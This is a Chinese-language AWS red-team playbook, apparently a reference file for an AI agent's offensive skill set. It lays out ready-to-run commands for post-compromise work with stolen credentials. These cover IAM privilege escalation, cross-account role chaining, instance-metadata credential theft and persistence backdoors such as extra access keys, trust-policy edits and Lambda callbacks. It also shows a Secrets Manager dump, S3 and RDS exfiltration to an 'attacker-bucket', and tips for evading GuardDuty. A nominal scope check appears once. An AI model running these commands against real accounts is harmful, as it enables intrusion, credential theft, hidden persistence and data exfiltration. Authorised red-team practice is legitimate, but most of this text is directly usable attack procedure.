# AWS Attack Flow / AWS 红队流程

> 上游入口：`SKILL.md` → 本文档。
> 适用：已拿到至少一组 AWS 凭据（AccessKey/SecretKey/Session Token / IAM Role STS / IMDS-fetched cred），要在 AWS 账号 / 跨账号链路上走完整后渗透。
> ATT&CK 覆盖：TA0007 Discovery、TA0004 Privilege Escalation、TA0008 Lateral Movement、TA0003 Persistence、TA0009 Collection、TA0010 Exfiltration。

## 必备工具

```text
□ aws-cli         — 官方 CLI
□ Pacu            — 攻击模块仓库
□ CloudFox        — 路径发现
□ PMapper         — IAM 图建模
□ Prowler         — 错配扫描
□ ScoutSuite      — 资产快照
□ Steampipe（可选）— SQL-on-AWS 资产盘点
```

缺工具：`bootstrap-reverse.ps1 -Capability @('aws-cli','pacu','cloudfox','pmapper','prowler','scoutsuite') -StartServices`

---

## 0. 凭据准入与边界检查 (T1078.004)

```bash
# 配置 profile（不要污染 default profile）
aws configure --profile redteam
# 验证身份
aws sts get-caller-identity --profile redteam
# → 记录 Account ID, ARN, UserId
# → 确认 Account ID 在 SOW in-scope 列表中
aws iam get-user --profile redteam || echo "Role-based, no IAM user"
# 看 session 剩余时间（STS 临时凭据）
aws sts get-session-token --profile redteam 2>&1 | head -5
```

> 不在 in-scope 账号 → **立即停止**，回到 `attack-chain` 重新规划。

---

## 1. Discovery / 资产 + 权限盘点 (TA0007 / T1580 / T1526 / T1538)

### 1.1 基线快照（**只读，进 ATT&CK Discovery 战术**）

```bash
# ScoutSuite — 资产 + 权限快照（HTML 报告）
scout aws --profile redteam --report-dir scout-out/

# Prowler — 200+ 错配检测
prowler aws --profile redteam -M json -o prowler-out/

# CloudFox — 攻击者视角的路径发现（**这是阶段 1 的核心**）
cloudfox aws --profile redteam all-checks
# 关键产物：
#   loot/aws-{accountid}-{region}/permissions.csv          ← 用户/角色 → policy 全量映射
#   loot/aws-{accountid}-{region}/role-trusts.csv          ← cross-account trust 边
#   loot/aws-{accountid}-{region}/secrets.csv              ← 在 EC2 user-data / Lambda env 里硬编码的明文凭据候选
```

### 1.2 IAM 图建模（PMapper）

```bash
# 把账号摄入图数据库
pmapper --profile redteam graph create
# 找到当前 principal → admin 的所有路径
pmapper --profile redteam query "preset privesc <current-principal-arn>"
# 找到 cross-account 信任路径
pmapper --profile redteam query "preset connected"
```

### 1.3 服务面盘点（按价值排序）

| 服务 | 命令 | 看什么 |
|------|------|--------|
| S3 (T1530) | `aws s3api list-buckets --profile redteam` | 命名规则 → 暗示存放数据类型 |
| EC2 | `aws ec2 describe-instances --profile redteam` | InstanceProfile → IAM 提权入口 |
| Lambda | `aws lambda list-functions --profile redteam` | env vars 常含凭据；Role 权限滥用 |
| Secrets Manager | `aws secretsmanager list-secrets --profile redteam` | 直接拿其他系统凭据 |
| RDS | `aws rds describe-db-instances --profile redteam` | 数据落点 |
| KMS (T1552.005) | `aws kms list-keys --profile redteam` | grants 配错可解密任意密文 |
| ECR | `aws ecr describe-repositories --profile redteam` | 容器镜像被植入入口 |

---

## 2. Privilege Escalation / IAM 提权 (TA0004 / T1078.004)

### 2.1 21 个经典 IAM privesc 路径

PMapper / Pacu `iam__privesc_scan` 模块覆盖 Rhino Labs 总结的 21 条路径，重点：

| 路径 | 入口权限 | 提权动作 |
|------|---------|---------|
| Create new policy version | `iam:CreatePolicyVersion` | 写一条 Allow `*` 的新版本，置为 default |
| Set existing default policy version | `iam:SetDefaultPolicyVersion` | 切到旧的高权限版本 |
| Create access key | `iam:CreateAccessKey` for admin user | 直接拿 admin AK |
| Update assume role policy | `iam:UpdateAssumeRolePolicy` for admin role | 把自己加入 trust，然后 assume |
| PassRole + Lambda | `iam:PassRole` + `lambda:CreateFunction` | 用 admin role 创建 Lambda 跑命令 |
| PassRole + EC2 | `iam:PassRole` + `ec2:RunInstances` | 把 admin role 挂到 EC2，SSH/SSM 进去 |
| PassRole + Glue/SageMaker/CloudFormation | 同模式不同载体 | 找当前账号有哪个服务 |
| Attach policy to user | `iam:AttachUserPolicy` | 给自己挂 AdministratorAccess |
| Put user policy (inline) | `iam:PutUserPolicy` | inline 比 managed 隐蔽 |
| (其余 12 路径见 Pacu 模块) | | |

### 2.2 Pacu 自动跑

```bash
pacu --new-session redteam-aws
# 在 Pacu shell 里：
import_keys default
run iam__enum_permissions
run iam__privesc_scan        # 自动尝试 21 条路径
# 命中后自动执行 → 当前 session 已升权
```

### 2.3 服务级别的"伪提权"

```text
□ S3 bucket policy 配错 → 跨账号读
□ KMS grant + Decrypt → 解密本不该读的密文（含 RDS / EBS 快照）
□ STS AssumeRole 信任配错 → 拿到外部账号的角色（最常见的 cross-account 入口）
□ Cognito identity pool unauthenticated role 过权 → 公网拿到凭据
```

---

## 3. Lateral Movement / 跨服务+跨账号 (TA0008 / T1550.001 / T1199)

### 3.1 跨账号 AssumeRole 链

```bash
# 第一跳
aws sts assume-role --role-arn arn:aws:iam::222222222222:role/CrossAccountAdmin \
    --role-session-name redteam-1 --profile redteam
# 把返回的 AccessKey/SecretKey/Token 写入新 profile，继续走
aws configure --profile target2
# CloudFox 在这里能继续：
cloudfox aws --profile target2 role-trusts   # 找下一跳
```

### 3.2 容器 / Serverless 逃逸到底层 IAM

```text
EC2 → IMDSv2 token → instance role credentials
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
ECS → task role
Lambda → execution role（在 Lambda 函数里 print env）
EKS → IRSA role（pod 内拿 ServiceAccount → IAM Role）
SageMaker / Glue → execution role
```

### 3.3 容器面横向

```bash
# 已在某 EKS pod 内：
TOKEN=$(curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://kubernetes.default/api/v1/namespaces/default/serviceaccounts/$(whoami))
# 拿到 SA token 后，对应的 IAM Role 就在身边
# 后续打法见 `../../CTF-Sandbox-Orchestrator/competition-k8s-control-plane/`
```

---

## 4. Persistence / 长效后门 (TA0003 / T1098.001 / T1136.003)

| 技术 | 命令 | OPSEC |
|------|------|-------|
| 新建 IAM user + 长效 AK | `aws iam create-user; aws iam create-access-key` | 容易触发 GuardDuty IAMUser/AnomalousBehavior |
| 给现有用户加 AK（备用） | `aws iam create-access-key --user-name existing` | 隐蔽，但目标用户用 AK 时会异常 |
| Update SAML provider | `aws iam update-saml-provider --saml-metadata-document ...` | 联邦登录后门 |
| Cross-account trust 修改 | `aws iam update-assume-role-policy` 加入攻击者账号 | 最隐蔽，尤其是大量 trust 关系的目标 |
| Lambda backdoor | 创建 Lambda + EventBridge 定时触发回连 | Lambda 函数本体过审计；定时器不显眼 |
| Cognito user 添加 | `aws cognito-idp admin-create-user` | App-side 影响 |

---

## 5. Collection + Exfiltration (TA0009 / TA0010)

```bash
# Collection
# S3 全量 sync
aws s3 sync s3://target-bucket /tmp/loot --profile target_admin
# Secrets Manager dump（KMS 解密路径已通）
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text \
  | xargs -I{} aws secretsmanager get-secret-value --secret-id {} > secrets.json
# RDS 快照导出 → S3 → 攻击者桶
aws rds create-db-snapshot --db-instance-identifier prod --db-snapshot-identifier rt-export
aws rds start-export-task --export-task-identifier rt-export --source-arn ... --s3-bucket-name attacker-bucket

# Exfiltration — T1537 转存到攻击者云账号（同 vendor，合法 PUT）
aws s3 cp /tmp/loot/ s3://attacker-bucket/$(date +%s)/ --recursive --profile target_admin
# 详细技术：见 pentest-tools/references/network-attack-defense.md §外带
```

---

## 6. OPSEC / 检测面

```text
□ CloudTrail 是默认开的；管理事件不可关。所有 IAM mutation / AssumeRole / Get* 都进日志。
□ GuardDuty 检测：
  - IAMUser/AnomalousBehavior（新地理位置、罕见 API 调用）
  - Recon:IAMUser/MaliciousIPCaller
  - UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
□ Detective / Security Hub：跨账号关联告警
□ Access Analyzer：trust policy 修改即时告警（cross-account trust 后门暴露最快）
□ 速率：Pacu / CloudFox 默认并发偏高 — `pacu --no-anon`，CloudFox 自带节流
□ 出口位置：Tor exit / 廉价 VPS IP 段命中威胁情报概率高，先用过的 IP 比新 IP 安全
```

## 7. 工具命令速查

| 任务 | 命令 |
|------|------|
| 当前身份 | `aws sts get-caller-identity --profile X` |
| 全量错配 | `prowler aws --profile X` |
| 资产快照 | `scout aws --profile X --report-dir out/` |
| IAM 路径 | `pmapper --profile X query "preset privesc <arn>"` |
| 攻击模块 | `pacu --new-session ...` → `run iam__privesc_scan` |
| 资源/路径 | `cloudfox aws --profile X all-checks` |
| 云资产 SQL | `steampipe query "select * from aws_iam_user where access_key_1_active"` |

## 参考

- [Rhino Security Labs — 21 IAM privesc paths](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks — AWS Pentesting](https://book.hacktricks.wiki/en/pentesting-cloud/aws-pentesting/)
- [PMapper docs](https://github.com/nccgroup/PMapper)
- [Pacu modules](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules)
- [CloudFox docs](https://github.com/BishopFox/cloudfox)
- 进入企业链路前先查 `field-journal/_index.md` 是否有相似目标 vendor 的历史经验
